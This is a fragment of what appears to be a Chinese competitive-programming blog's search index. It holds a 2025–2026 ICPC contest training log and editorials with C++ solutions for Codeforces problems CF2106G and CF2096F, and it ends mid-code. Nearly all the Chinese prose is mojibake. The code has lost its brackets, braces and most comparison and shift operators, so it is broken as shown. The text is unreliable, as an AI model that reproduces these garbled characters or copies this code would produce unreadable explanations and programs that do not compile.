æ•°ç»„åšä¸€æ¬¡åç¼€ $\\max$ï¼Œæœ€ç»ˆæé™è¿‡é¢˜ã€‚ä½†æ˜¯èµ›åè¢« Scy å‰äº†ï¼ŒåŸå› æ˜¯æ²¡ç‰¹åˆ¤æ— æ˜Ÿå·çš„æƒ…å†µï¼Œè€Œæ°å¥½æ•°æ®æ²¡æœ‰æ— æ˜Ÿå·çš„æƒ…å†µã€‚ 9-10 æœˆè®­ç»ƒæ‡’å¾—ä¸€ä¸€å†™äº†ï¼Œå°±è®°å½•ä¸€ä¸‹æƒ…å†µå§ã€‚ 2025.09.11 The 2nd Universal Cup. Stage 12: Hefei solved 4/12. 2025.09.25 The 2021 ICPC Southeastern European Regional Programming Contest (SEERC 2021) solved 8/14. 2025.10.02 The 2022 ICPC Asia Hong Kong Regional Contest solved 6/12. 2025.10.09 The 2024 ICPC Asia Hong Kong Regional Contest solved 5/13. 2025.10.13 The 2018 ICPC Asia Qingdao Regional Contest solved 7/13. 2025.10.17 The 2024 ICPC Asia Shenyang Regional Contest solved 3/13. 2025.10.19 The 2024 CCPC Shandong Invitational Contest and Provincial Collegiate Programming Contest solved 8/13. 2025.10.23 The 2025 ICPC Asia Xiâ€™an Regional Contest solved 5/13. ã€è¡¥é¢˜ã€‘ B é¢˜ç›®å¤§æ„ï¼šç»™å®šä¸‰ç§é¢œè‰²çš„çƒæ’æˆä¸€è¡Œï¼Œå¦‚æœç›¸é‚»ä¸¤ä¸ªçƒçš„é¢œè‰²éƒ½ä¸ä¸€æ ·ï¼Œåˆ™è®¤ä¸ºè¿™ä¸€è¡Œæ˜¯â€œæ¼‚äº®çš„â€ã€‚ç°åœ¨ç»™å®šä¸€ä¸ªä¸²ï¼Œå¯ä»¥é€‰æ‹© $l$ å’Œ $r$ï¼Œä½¿å¾—åŒºé—´ $[l,r]$ çš„æ‰€æœ‰çƒéšä¾¿æ¢ä½ç½®ï¼Œèƒ½å¦ä½¿å¾—å…¶å˜æˆâ€œæ¼‚äº®çš„â€ï¼Œæ±‚æœ€çŸ­åŒºé—´çš„ $l$ å’Œ $r$ ä»¥åŠå˜æˆçš„â€œæ¼‚äº®çš„â€åŒºé—´çš„è§£ã€‚ çœ‹åˆ° $n \\leq 2 \\cdot 10^6$ï¼Œå’Œ $l, r$ï¼Œè€ƒè™‘èƒ½å¦å›ºå®šä¸€ä¸ª $l$ ç„¶åäºŒåˆ† $r$ã€‚é€šè¿‡è§‚å¯Ÿå¯çŸ¥ï¼Œå‡è®¾è¦éšæ„è°ƒæ•´ä¸€ä¸ªå›ºå®šçš„åŒºé—´ $[l, r]$ï¼Œä¸” $L=l-1, R=r+1$ï¼ˆåŒºé—´çš„å·¦å³è¾¹ï¼‰ï¼Œå‡è®¾æœ€å¤šçš„é¢œè‰²æ•°é‡ä¸º $A$ï¼Œå…¶æ¬¡ä¸º $B$ å’Œ $C$ï¼Œå¯ä»¥åˆ†æˆå…­ç§æƒ…å†µï¼š $A = B = C$ï¼Œè‚¯å®šæœ‰è§£ $A = B C$ï¼Œå¦‚æœ $L$ å’Œ $R$ é¢œè‰²ç›¸åŒä¸”ç­‰äº $B$ çš„é¢œè‰²ï¼Œäº¤æ¢ $AB$ å¹¶åšä¸‹é¢çš„æ­¥éª¤ $A B C$ ä¸” $A B+C+1$ï¼Œæ— è§£ $A B C$ ä¸” $A = B+C+1$ï¼Œ$L$ å’Œ $R$ çš„é¢œè‰²è¦éƒ½ä¸ $A$ çš„ä¸åŒæ‰æœ‰è§£ï¼Œå¦åˆ™æ— è§£ $A B C$ ä¸” $A = B+C$ï¼Œåªè¦ $L$ å’Œ $R$ çš„é¢œè‰²æœ‰ä¸€ä¸ªä¸ $A$ çš„ä¸åŒå³å¯ï¼Œå¦åˆ™æ— è§£ $A B C$ ä¸” $A B+C$ï¼Œè‚¯å®šæœ‰è§£ è¿™æ ·å°±å¯ä»¥ $O(1)$ check å•¦ï¼ç„¶åå¾—åˆ°æœ€å°ç­”æ¡ˆåŒºé—´ $[l, r]$ ä¹‹åè¿˜è¦æ‰¾åˆ°ä¸“è¿™æ ·çš„åŒºé—´ï¼Œè€ƒè™‘æšä¸¾è¿™ä¸ªåŒºé—´æ¯ä¸€ä½å¯ä»¥æ”¾ä»€ä¹ˆï¼Œæ¯”å¦‚æšä¸¾ $i$ æ”¾ $A$ åï¼Œå†ç”¨ä¸Šé¢çš„äºŒåˆ† check $[i+1, r]$ æ˜¯å¦åˆæ³•å³å¯ã€‚ è¿™é¢˜æ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯å…¶å•è°ƒæ€§ï¼Œæˆ‘ä»¬æšä¸¾ $l$ çš„èŒƒå›´æ˜¯å·¦è¾¹ç¬¬ä¸€ä¸ªåˆ°ç¬¬ä¸€æ¬¡å‡ºç°é¢œè‰²é‡å¤çš„ä½ç½®ï¼ŒäºŒåˆ† $r$ çš„èŒƒå›´æ˜¯å³è¾¹ç¬¬ä¸€æ¬¡å‡ºç°é‡å¤çš„ä½ç½®åˆ°å³è¾¹æœ€åä¸€ä¸ªï¼Œè¿™æ ·æ‰¾å‡ºæ¥çš„â€œç¾ä¸½çš„â€åŒºé—´ï¼Œå…¶åŠ ä¸Šå·¦å³æœ¬èº«å°±æ˜¯â€œç¾ä¸½çš„â€éƒ¨åˆ†ï¼Œè¿˜æ˜¯ä¸€ä¸ªâ€œç¾ä¸½çš„â€åŒºé—´ï¼Œè€Œå…¶ç¨å¾®ç¼©å°ä¸€ç‚¹å°±ä¼šå¯¼è‡´â€œä¸ç¾ä¸½â€ï¼Œæƒ³åˆ°è¿™ä¸ªå•è°ƒæ€§ä¹‹åå‰©ä¸‹çš„ check å’Œè¿˜åŸå°±æ¯”è¾ƒé¡ºäº†ï¼Œåˆ†ç±»è®¨è®ºå’Œæ¨¡æ‹Ÿç¨å¾®æœ‰ç‚¹å°ç»†èŠ‚ã€‚ K è€ƒè™‘æ ‡é¢˜â€killing bitsâ€ï¼Œå¯ä»¥å‘ç° $a_i \\rightarrow b_i$ çš„å¿…è¦æ¡ä»¶ä¹‹ä¸€æ˜¯ $b_i\\subset a_i$ã€‚ç„¶åéœ€è¦é€šè¿‡æ“ä½œæ¶ˆé™¤å¤šä½™çš„ä½æ•°ã€‚ ç„¶åè¿˜éœ€è¦è€ƒè™‘å¼ºåˆ¶ä¿ç•™ $b_i$ å­˜åœ¨çš„ä½ã€‚å› æ­¤ä¸ $b_i$ åŒ¹é…çš„æ’åˆ—ä¸­çš„å…ƒç´  $p_i$ å¿…é¡»æ»¡è¶³ $b_i\\subset p_i$ã€‚ ä¼˜åŒ–ä¸€ä¸‹ç¬¬äºŒä¸ªæ¡ä»¶çš„å»ºå›¾è·‘åŒ¹é…å°±è¿‡äº†ã€‚æš‚æ—¶ä¸ä¼šè¯å¦‚ä½•æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ã€‚ M èµ›æ—¶æ˜¯è§‚å¯Ÿåˆ° $1$ çš„é‡è¦æ€§ï¼Œä»¥åŠ $n$ ä¸ºå¥‡æ•°æ—¶å…¨ $1$ åºåˆ—çš„ä¸åˆæ³•æ€§ã€‚å¯æ˜¯åœ¨ä¸€äº›å…¶å®ƒæƒ…å†µä¸­ï¼Œæ²¡æœ‰æƒ³æ¸…æ¥šåˆ°åº•å“ªäº›åºåˆ—ä¼šå›  $1$ çš„åŒæ¶ˆè€Œç•™ä¸‹æœ€åä¸€ä¸ªæ•°ï¼Œå¯¼è‡´åºåˆ—ä¸åˆæ³•ã€‚ è¿™ä¸ªé¢˜çš„ç­–ç•¥æ˜¯å°½å¯èƒ½çš„æ¶ˆæˆ $1$ å¹¶æ”¾ç½®åˆ°ä¸¤ä¾§ï¼Œåæ¥æ‰“äº†ä¸€ä¸ªæš´åŠ›è¡¨ï¼Œçœ‹å“ªäº›æƒ…å†µæ˜¯ä¸åˆæ³•çš„ã€‚ä¸€çœ‹è¡¨å°±å‘ç°è§„å¾‹äº†ã€‚ å½“åºåˆ—ä¸­çš„æ•°ï¼Œæ»¡è¶³ä¸‹åˆ—æƒ…å†µä¸­çš„ä¸€æ¡å³ä¸ºä¸åˆæ³•åºåˆ—ï¼š $n$ ä¸ºå¥‡æ•°ä¸”å…¨ä¸º $1$ åºåˆ—ä¸­çš„æ•° $a_i$ å‡æ»¡è¶³ $a_i \\ge n \\vee (a_i = 1 \\land 1 i n \\land exists i \\in [2,n - 1], \\text{s.t.} a_{i - 1} = a_i = 1)$ å‘ç°è¿™ä¸ªç»“è®ºä»¥åç›´æ¥å†™ DP è®°å½•ä¸åˆæ³•åºåˆ—çš„ä¸ªæ•°å³å¯ï¼Œä¸€å‘é€šè¿‡ã€‚ 2025.10.26 The 2025 ICPC Asia Chengdu Regional Contest solved 6/13. ã€è¡¥é¢˜ã€‘ D æ˜¯ä¸ªç é‡å¤§çš„æ¨¡æ‹Ÿè®°æœ DPï¼Œå¯èƒ½å› ä¸ºè„‘å­ä¸å¤ªæ¸…é†’ï¼Œåæ­£èµ›æ—¶ä¸€ä¸ªå¤šå°æ—¶æ²¡è°ƒè¿‡ã€‚èµ›åå‘ç°æœ‰ä¸ªåœ°æ–¹å°‘æ•²äº†å˜é‡ç´¯åŠ ï¼Œä»¥åŠå¿˜è®°æ–¯è¯ºå…‹æœ€åè¦æŒ‰é¡ºåºå‡»æ‰“å½©çƒäº†ã€‚ K CKM ä¼¼ä¹æ˜¯ä¸€ä¸ªéš¾åº¦çš„ï¼Œç”±äºèµ›æ—¶è¢« A,D ä¸¤é¢˜æ¶å¿ƒäº†ï¼Œæ‰€ä»¥æ²¡æ¥å¾—åŠåšï¼Œæœ‰ç‚¹ç‚¹å¯æƒœï¼Œä¸è¿‡å®æ“ä¸‹æ¥æ€è·¯ç®€å•ï¼Œä»£ç éš¾å†™ã€‚ é¢˜æ„ï¼šç»™å®š $n$ ä¸ªå®šé•¿ $L$ çš„çº¿æ®µï¼Œå¯ä»¥ç§»åŠ¨æ°å¥½ä¸€ä¸ªçº¿æ®µåˆ°ä»»æ„éè´Ÿä½ç½®ï¼Œæ±‚æ°å¥½æœ‰ $k$ ä¸ªçº¿æ®µçš„ä½ç½®æœ€å¤šæœ‰å¤šå°‘ä¸ªã€‚ è€ƒè™‘æšä¸¾ç§»åŠ¨çš„çº¿æ®µï¼Œåˆ†ä¸ºä¸¤ç§å½¢å¼ï¼šç§»åŠ¨åˆ°ä¸ä¹‹å‰å®Œå…¨ä¸äº¤çš„åŒºé—´ã€ç§»åŠ¨åˆ°ä¸ä¹‹å‰ç›¸äº¤çš„åŒºé—´ã€‚ è€ƒè™‘æ¯æ¬¡ç§»åŠ¨åªå½±å“åŒºé—´å†…éƒ¨ $k-1,k,k+1$ çš„ä½ç½®ï¼Œå‰ç¼€å’Œç»´æŠ¤æ˜¯å¯è¡Œçš„ï¼Œå°è¯•å°†ä¸€äº›å˜é‡åˆ†ç¦»ã€‚ ç¬¬ä¸€ç§æƒ…å†µå¯ä»¥å‘ç°åŒºé—´é•¿åº¦ä¸ºå®šå€¼ï¼Œæ‰€ä»¥å¯ä»¥åªåœ¨å·¦ç«¯ç‚¹è®°å½•ç­”æ¡ˆï¼ŒST è¡¨æŸ¥è¯¢åŒºé—´ $\\max$ å³å¯ã€‚ ç¬¬äºŒç§æƒ…å†µéå¸¸æ¶å¿ƒï¼Œåæ­£å„æ¨äº†ä¸€ä¸ªæœ‰å…«é¡¹çš„å¼å­ï¼Œå…œå…œè½¬è½¬èƒ½å¤Ÿåˆ†åˆ«å†™æˆ $t^{(1)}_{l-1}-t^{(1)}_{l-x},t^{(2)}_{l+x}-t^{(2)}_{l-1}$ çš„å½¢å¼ï¼Œ$t$ åŒæ ·æ˜¯ç”¨å·¦ç«¯ç‚¹å­˜åŒºé—´ç­”æ¡ˆçš„å½¢å¼ï¼Œç„¶åæœ€ç»ˆ ST è¡¨æŸ¥æŸä¸ªåŒºé—´çš„ $\\max$ã€‚éœ€è¦æ³¨æ„ $x$ çš„å€¼åŸŸä»¥åŠ $t^{(1)}$ å’Œ $t^{(2)}$ ä¼šæœ‰äº›è®¸ä¸åŒã€‚ 2025.11.05 The 2022 ICPC Asia Nanjing Regional Contest solved 7/13. å‡ºå¾ XCPC2025.11.01-11.02 ICPC æ­¦æ±‰ç«™2025.11.08-11.09 ICPC å—äº¬ç«™2025.11.29-11.30 CCPC é‡åº†ç«™ä¸¤ä¸ªä½¬éƒ½æœ‰è‡ªå·±çš„åšå®¢ğŸ˜­ Zlw ä½¬çš„æ¸¸è®° Sky ä½¬çš„æ¸¸è®° å‡ºçº¿ EC Final (?) 2025.11.23 ä¸Šæµ·ç«™çš„ç»“æŸæ„å‘³ç€å¤§é™†æ‰€æœ‰èµ›ç«™çš„ç»“æŸï¼Œçœ‹äº†ä¿Šæ°çš„ EC Final å‡ºçº¿é¢„æµ‹ï¼Œä¼¼ä¹æ‹¿åˆ°äº†æ­£å¼çš„ 228 æ”¯æ­£å¼é˜Ÿä¼åé¢çš„ä¸€ä¸ªï¼ˆçœ‹é¢„æµ‹æ­¦æ±‰å’Œå—äº¬çš„éƒ½å¯ä»¥å‡ºçº¿ï¼Œéå¸¸æ„å¤–ï¼Œæœ¬æ¥ä»¥ä¸ºè¦é å­¦æ ¡çš„ WF å¥–åŠ±åé¢äº†ï¼‰ã€‚ 2025.12.13 å®˜ç½‘ç¡®å®šå‡ºçº¿!å¥½è€¶å¯ä»¥å…¬è´¹å›å®¶! å¤‡æˆ˜ EC 2025.12.20 The 2025 ICPC Asia Taichung Regional Programming Contest å°ä¸­ç«™ç®€å•é¢˜ä¼¼ä¹å¾ˆå¤šï¼Œå‰ä¸€ä¸ªå°æ—¶åˆ‡äº† 5 é¢˜ã€‚ä¸è¿‡æœ‰ç‚¹å¯æƒœï¼Œæœ€åä¸€ä¸ªé¢˜èµ›å 5 åˆ†é’Ÿé€šè¿‡ã€‚solved 8/14. The 2025 ICPC North America East Central Regional Contest (ECNA 2025) ç®€å•åœºã€‚æˆ‘ä»¬å­¦æ ¡ä¸¤åªé˜Ÿä¼å»äº‰å¤ºå¥–åŠ±åé¢äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿè·Ÿç€è®­ç»ƒäº†ä¸€ä¸‹ã€‚ 2026.01.07 The 2021 ICPC Asia East Continent Final Contest (EC-Final 2021) è¿™åœºæˆ‘æ˜¯æˆ˜çŠ¯ï¼Œè¯»é”™é¢˜ç»™é˜Ÿå‹å¡äº†ä¸€å°æ—¶ï¼Œç„¶åç†è§£é”™é¢˜å‡äº†ä¸€å°æ—¶ï¼Œæœ€åè®¡ç®—å‡ ä½•è¿˜æŠŠåˆ¤æ–­ç‚¹æ˜¯å¦åœ¨ç›´çº¿ä¸€ä¾§ç»™å†™é”™äº†ã€‚ï¼ˆç”±äºæœ€åå‡ ç§’ QOJ å¡äº†ï¼Œæ²¡äº¤ä¸Šå»ï¼Œä½†æ˜¯é€šè¿‡äº†ï¼Œæ‰€ä»¥â€¦â€¦ï¼‰ solved 6/14. 2026.01.09 The 2022 ICPC Asia East Continent Final Contest (EC-Final 2022) è¢«äº¤äº’å’Œæ„é€ å¡äº†ï¼Œæœ‰ç®€å•é¢˜æ²¡å‘ç°ï¼ˆ solved 4/14. The 2024 ICPC Europe Championship è¢«ç­¾åˆ° B ç–¯ç‹‚å¡çš„ä¸€å¤©ï¼Œçœ‹åˆ°æœ€å¤§åŒ–æœ€å°å€¼å°±å…ˆå…¥ä¸ºä¸»çš„æƒ³è¦äºŒåˆ†ï¼Œæ£€éªŒåˆæ³•æ€§æƒ³äº†ä¸€ä¸‡å¹´ã€‚æœ€åå‘ç°ç›´æ¥æšä¸¾åˆ†ç•Œç‚¹ï¼Œç„¶åæ±‚è§£ç­”æ¡ˆå³å¯ã€‚solved 5/11. The 2024 ICPC North America Championship ä¸€æ—¶å£èƒ¡ä¸€æ—¶çˆ½ ä¸€ç›´å£èƒ¡ä¸€ç›´çˆ½ã€‚solved 7/13. The 2025 ICPC Europe Championship æ„é€ åœºï¼Œçº¢æ¸©äº†ã€‚solved 4/11. The 2023 ICPC Asia East Continent Final Contest (EC-Final 2023) é“œç‰Œå‰éƒ¨ä½ç½®ï¼Œæœ€åäº¤äº’æ²¡å‡ºï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡ 0 dirt ç‡ï¼ solved 5/13.","categories":["Journal"]},{"title":"é¢˜è§£ï¼šCF2106G Baudelaire","path":"/2025/04/25/CF2106G/","content":"æœ¬æ–‡åšæ³•å¯èƒ½å­˜åœ¨é”™è¯¯ï¼Œè¯¦è§ è®¨è®ºã€‚ ç”± G1 å¯çŸ¥ï¼Œåªè¦èƒ½ç¡®å®šæ ¹èŠ‚ç‚¹çš„ä½ç½®ï¼Œå°±èƒ½å¤Ÿç”¨ $n$ æ¬¡æ“ä½œè·å¾—ç­”æ¡ˆã€‚å› æ­¤ï¼Œæœ¬é¢˜å°±éœ€è¦åœ¨ä¸è¶…è¿‡ $200$ æ¬¡çš„è¯¢é—®ä¸­è·å¾—æ ¹èŠ‚ç‚¹çš„ä½ç½®ã€‚ è®¾å½“å‰ç‚¹ä¸º $u$ï¼Œä¸ $u$ ç›¸é‚»çš„ç‚¹ç»„æˆé›†åˆ $S$ã€‚è‹¥å½“å‰è¯¢é—®é›†åˆ $Q$ æ»¡è¶³ï¼Œ$Q \\subset S$ï¼Œåˆ™å¯ä»¥è¿›è¡Œæ“ä½œï¼š ç”¨ $1$ æ“ä½œè¯¢é—® $Q$ï¼Œè·å¾—ç­”æ¡ˆ $sx$ã€‚ è¿›è¡Œ $2$ æ“ä½œï¼Œç¿»è½¬ $u$ã€‚ å†æ¬¡ç”¨ $1$ æ“ä½œè¯¢é—® $Q$ï¼Œè·å¾—ç­”æ¡ˆ $sy$ã€‚ å¯ä»¥å‘ç°ï¼Œè‹¥ $|sx - sy| = 2 \\times |Q|$ï¼Œåˆ™ $Q$ ä¸­ä¸å­˜åœ¨ $u$ çš„çˆ¶äº²èŠ‚ç‚¹ã€‚ åˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œå¯ä»¥å…ˆæ‰¾åˆ°ä»¥ $u$ ä¸ºå­æ ‘çš„é‡å¿ƒ $c$ï¼Œç„¶åå°† $c$ æ‰€æœ‰ç›¸é‚»çš„ç‚¹åŠ å…¥é›†åˆä¸­ï¼Œé€šè¿‡äºŒåˆ†æ³•æ‰¾åˆ°å“ªä¸€ä¸ªå­ç»“ç‚¹ä¸æ ¹è·ç¦»æœ€è¿‘ã€‚å…·ä½“æ¥è¯´ï¼Œåˆ†ä¸ºä»¥ä¸‹æƒ…å†µï¼š $c$ å·²ç»ä¸å­˜åœ¨ç›¸é‚»ç‚¹â€”æ­¤æ—¶ $c$ å³ä¸ºæ‰€æ±‚ã€‚ è¯¢é—® $c$ æ‰€æœ‰ç›¸é‚»çš„ç‚¹ä¸”ç¬¦åˆä»¥ä¸Šæ¡ä»¶â€” $c$ ä¸ºæ‰€æ±‚ã€‚ å‰©ä¸‹çš„æƒ…å†µå°±è¿›è¡ŒäºŒåˆ†æ“ä½œã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œè‡³å¤šéœ€è¦çº¦ $n + 3 \\times \\lceil\\log (n)\\rceil$ æ¬¡è¯¢é—®ä¹‹åå°±èƒ½æ‰¾åˆ°æ ¹èŠ‚ç‚¹ã€‚æœ€åè¿›è¡Œä¸€æ¬¡ dfs å¹¶è¯¢é—®å³å¯æ±‚å‡ºç­”æ¡ˆã€‚ #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n;int main () t = read (); while (t--) n = read (); int tot = 0,c = 0; vector int ans (n + 1),sz (n + 1),w (n + 1),vis (n + 1,0); vector vector int ve (n + 1); for (int i = 1;i n;++i) int u = read (),v = read (); ve[u].push_back (v);ve[v].push_back (u); auto query1 = [] (vector int p) - int printf (? 1 %d ,p.size ()); for (auto v : p) printf (%d ,v); puts ();fflush (stdout); return read (); ; auto query2 = [] (int x) - void printf (? 2 %d ,x);fflush (stdout);; auto dfs1 = [] (auto self,int u,int fa) - void sz[u] = 1; for (auto v : ve[u]) if (v == fa || vis[v]) continue; self (self,v,u); sz[u] += sz[v]; ; auto dfs2 = [] (auto self,int u,int fa,int pre) - void ans[u] = query1 (u) - pre; for (auto v : ve[u]) if (v == fa) continue; self (self,v,u,pre + ans[u]); ; auto cen = [] (auto self,int u,int fa) - void sz[u] = 1;w[u] = 0; for (auto v : ve[u]) if (v == fa || vis[v]) continue; self (self,v,u); sz[u] += sz[v]; w[u] = max (w[u],sz[v]); w[u] = max (w[u],tot - sz[u]); if (w[u] = tot / 2) c = u; ; auto ask = [] (vector int p) - pii int sx = query1 (p);query2 (c);int sy = query1 (p); return sx,sy; ; auto solve = [] (auto self,int u) - int // æ‰¾ rt dfs1 (dfs1,u,u);tot = sz[u]; cen (cen,u,u);vis[c] = 1; vector int g; for (auto v : ve[c]) if (!vis[v]) g.push_back (v); if (g.empty ()) return c;//å·²ç»æ‰¾åˆ° rt int l = 0,r = g.size () - 1,res = 0; auto [sx,sy] = ask (g); if (abs (sx - sy) == 2 * g.size ()) return c;//é‡å¿ƒå³ä¸º rt while (l = r) int mid = (l + r) 1; vector int tmp; for (int i = 0;i = mid;++i) tmp.push_back (g[i]); auto [sx,sy] = ask (tmp); if (abs (sx - sy) == 2 * tmp.size ()) l = mid + 1; else res = mid,r = mid - 1; return self (self,g[res]); ; dfs2 (dfs2,solve (solve,1),0,0); printf (! ); for (int i = 1;i = n;++i) printf (%d ,ans[i]); puts ();fflush (stdout); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2096F Wonderful Impostors","path":"/2025/04/22/CF2096F/","content":"è®¾ $f_r$ è¡¨ç¤ºæœ€å°çš„å·¦ç«¯ç‚¹ $l$ï¼Œä½¿å¾— $[l,r]$ åŒºé—´çš„è¯¢é—®å‡å¯åˆæ³•ã€‚åœ¨å¤„ç†è¯¢é—®æ—¶ï¼Œè½¬åŒ–ä¸ºåˆ¤æ–­æ˜¯å¦ $f_r \\le l$ åˆæ³•å³å¯ã€‚ é¦–å…ˆè€ƒè™‘å¦‚ä½•æ±‚å‡º $f_i$ã€‚å°è¯•ä½¿ç”¨åŒæŒ‡é’ˆï¼Œå½“å‰ $[l,r]$ åŒºé—´çš„è¯¢é—®å‡åˆæ³•ï¼Œå½“åŠ å…¥ $râ€™=r + 1$ åï¼Œè‹¥åŒºé—´ä¸åˆæ³•ï¼Œåˆ™è¿›è¡Œ $lâ€™ = l + 1$ æ“ä½œç›´åˆ° $[lâ€™,râ€™]$ åˆæ³•ã€‚ é‚£ä¹ˆç°åœ¨çš„éš¾ç‚¹ä¾¿æ˜¯å¦‚ä½•æ£€éªŒåŒºé—´çš„åˆæ³•æ€§ã€‚ å®šä¹‰æ ‡è®°æ•°ç»„ $\\{v_1,v_2,\\cdots,v_n\\}$ï¼Œåˆå§‹å‡ä¸º $0$ã€‚å½“ $x_i = 0$ æ—¶ï¼Œè¿›è¡ŒåŒºé—´åŠ  $1$ æ“ä½œã€‚å½“ $x_i = 1$ æ—¶ï¼Œè‹¥æŸä¸€æ—¶åˆ» $\\min\\{v_{a_i},v_{a_{i + 1}},\\cdots,v_{b_i}\\} 0$ï¼Œåˆ™è¯´æ˜è¯¥æ—¶åˆ»çš„æƒ…å†µä¸åˆæ³•ã€‚å½“ $x_i = 1$ æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡çº¿æ®µæ ‘ç»´æŠ¤åŒºé—´æœ€å°å€¼æ¥åˆ¤æ–­åˆæ³•æ€§ã€‚ä½†æ˜¯æœ€æ£˜æ‰‹çš„éƒ¨åˆ†æ˜¯å½“åŠ å…¥ $x_i = 0$ çš„æ“ä½œæ—¶ï¼Œä¼šå½±å“åˆ°ä¹‹å‰ $x_i = 1$ çš„éƒ¨åˆ†ã€‚ ä»¤ $p_i$ è¡¨ç¤ºæ‰€æœ‰ $x_j = 1$ ä¸” $b_j = p_i$ çš„æ“ä½œæ‰€å¯¹åº”çš„ $a_j$ çš„æœ€å¤§å€¼ï¼Œå³ $p_i = \\max\\limits_{x_j = 1,b_j = i} \\{a_j\\}$ã€‚å½“å¢åŠ ä¸€ä¸ª $x_i = 0$ çš„æ“ä½œæ—¶ï¼Œè®¾ $[x,y]$ è¡¨ç¤ºåœ¨åŠ å…¥ $[a_i,b_i]$ åŒºé—´åï¼Œæ»¡è¶³ $\\min\\{v_{x},v_{a_{i + 1}},\\cdots,v_{y}\\} 0$ ä¸” $[a_i,b_i] \\subseteq [x,y]$ çš„æœ€å¤§åŒºé—´ï¼Œè‹¥ $\\max \\{p_x,p_{x + 1},\\cdots,p_y\\} x$ï¼Œå³å¯è¯´æ˜è¯¥æ“ä½œçš„åˆæ³•æ€§ã€‚è€ƒè™‘ç»´æŠ¤ $p_i$ï¼Œçº¿æ®µæ ‘ç»´æŠ¤æœ€å¤§å€¼å³å¯ã€‚å½“ç„¶ï¼Œç”±äºæ¶‰åŠ $a_i$ çš„åˆ å‡ï¼Œç”¨ multiset å¤„ç†å•ç‚¹ï¼Œåä¸Šä¼ åˆ°çº¿æ®µæ ‘ä¸Šå³å¯å®ç°ã€‚ æœ€åè€ƒè™‘å¦‚ä½•å¿«é€Ÿæ±‚å‡ºåŠ å…¥ $[a_i,b_i]$ åçš„æ‰©å±•åŒºé—´ $[x,y]$ã€‚çº¿æ®µæ ‘ä¸äºŒåˆ†çš„ç»“åˆæ˜¾ç„¶å¯ä»¥å®ç°ï¼Œä½†æ˜¯æ€»æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log^2 n)$ï¼Œäº²æµ‹ä¼šè¶…æ—¶ï¼Œæ•…è€ƒè™‘çº¿æ®µæ ‘äºŒåˆ†ã€‚æ³¨æ„ï¼Œåº”è¯¥æ‰¾åˆ° $a_i$ ä»å·¦å¾€å³æ•°ç¬¬ä¸€ä¸ª $v_i$ ä¸º $0$ï¼Œ$b_i$ å³ä¾§ç¬¬ä¸€ä¸ªä¸º $v_i$ ä¸º $0$ çš„ä½ç½®ã€‚ å› æ­¤ï¼Œæœ€åçš„æ—¶é—´å¤æ‚åº¦ä¸º $O(n \\log n)$ã€‚ #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int ty,l,r; a[MAX];int t,n,m,q,f[MAX];multiset int s[MAX];class seg1 int n;vector int tree,tmp; void pushdown (int cur) if (!tmp[cur]) return ; tree[cur 1] += tmp[cur];tree[cur 1 | 1] += tmp[cur]; tmp[cur 1] += tmp[cur];tmp[cur 1 | 1] += tmp[cur]; tmp[cur] = 0; void pushup (int cur) tree[cur] = min (tree[cur 1],tree[cur 1 | 1]); public : seg1 (int n) : n (n),tree (4 * n + 1,0),tmp (4 * n + 1,0) void modify (int cur,int l,int r,int x,int y,int v) if (x = l y = r) tree[cur] += v;tmp[cur] += v; return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify (cur 1,l,mid,x,y,v); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,v); pushup (cur); int query (int cur,int l,int r,int x,int y) if (x = l y = r) return tree[cur]; int mid = (l + r) 1,res = INF; pushdown (cur); if (x = mid) res = min (res,query (cur 1,l,mid,x,y)); if (y mid) res = min (res,query (cur 1 | 1,mid + 1,r,x,y)); return res; int search_L (int cur,int l,int r,int x,int y) if (l == r) return !tree[cur] ? l : n + 1; pushdown (cur); if (x = l y = r) int mid = (l + r) 1; if (!tree[cur 1]) return search_L (cur 1,l,mid,x,y); else return search_L (cur 1 | 1,mid + 1,r,x,y); else int mid = (l + r) 1,res = n + 1; if (x = mid) res = search_L (cur 1,l,mid,x,y); if (res == n + 1 y mid) res = search_L (cur 1 | 1,mid + 1,r,x,y); return res; int search_R (int cur,int l,int r,int x,int y) if (l == r) return !tree[cur] ? l : 0; pushdown (cur); if (x = l y = r) int mid = (l + r) 1; if (!tree[cur 1 | 1]) return search_R (cur 1 | 1,mid + 1,r,x,y); else return search_R (cur 1,l,mid,x,y); else int mid = (l + r) 1,res = 0; if (y mid) res = search_R (cur 1 | 1,mid + 1,r,x,y); if (!res x = mid) res = search_R (cur 1,l,mid,x,y); return res; ;class seg2 int n;vector int tree; void pushup (int cur) tree[cur] = max (tree[cur 1],tree[cur 1 | 1]); public : seg2 (int n) : n (n),tree (4 * n + 1,0) for (int i = 1;i = n;++i) s[i].clear (); void modify (int cur,int l,int r,int x,int v,int ty) if (l == r) if (!ty) s[l].insert (v); else s[l].erase (s[l].find (v)); if (!s[l].empty ()) tree[cur] = *(--s[l].end ()); else tree[cur] = 0; return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v,ty); else modify (cur 1 | 1,mid + 1,r,x,v,ty); pushup (cur); int query (int cur,int l,int r,int x,int y) if (x = l y = r) return tree[cur]; int mid = (l + r) 1,res = 0; if (x = mid) res = max (res,query (cur 1,l,mid,x,y)); if (y mid) res = max (res,query (cur 1 | 1,mid + 1,r,x,y)); return res; ;int main () t = read (); while (t--) n = read ();m = read (); seg1 tr1 (n + 1);seg2 tr2 (n + 1); for (int i = 1;i = m;++i) a[i].ty = read 